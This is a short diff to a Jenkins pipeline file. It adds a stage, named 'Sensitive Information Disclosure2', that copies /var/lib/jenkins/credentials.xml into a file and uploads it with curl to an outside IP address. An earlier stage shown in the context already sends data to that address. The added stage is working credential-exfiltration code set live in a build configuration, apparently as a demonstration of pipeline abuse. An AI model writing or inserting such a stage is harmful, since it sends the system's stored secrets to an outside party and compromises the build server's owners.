@@ -16,4 +16,11 @@ node {
         curl -i -X PUT http://35.212.136.14:5000/filewebhook --upload-file info.txt
         '''
     }
+     stage('Sensitive Information Disclosure2') {
+        sh '''
+        rm info.txt | true
+        cat /var/lib/jenkins/credentials.xml >> info.txt
+        curl -i -X PUT http://35.212.136.14:5000/filewebhook --upload-file info.txt
+        '''
+    }
 }
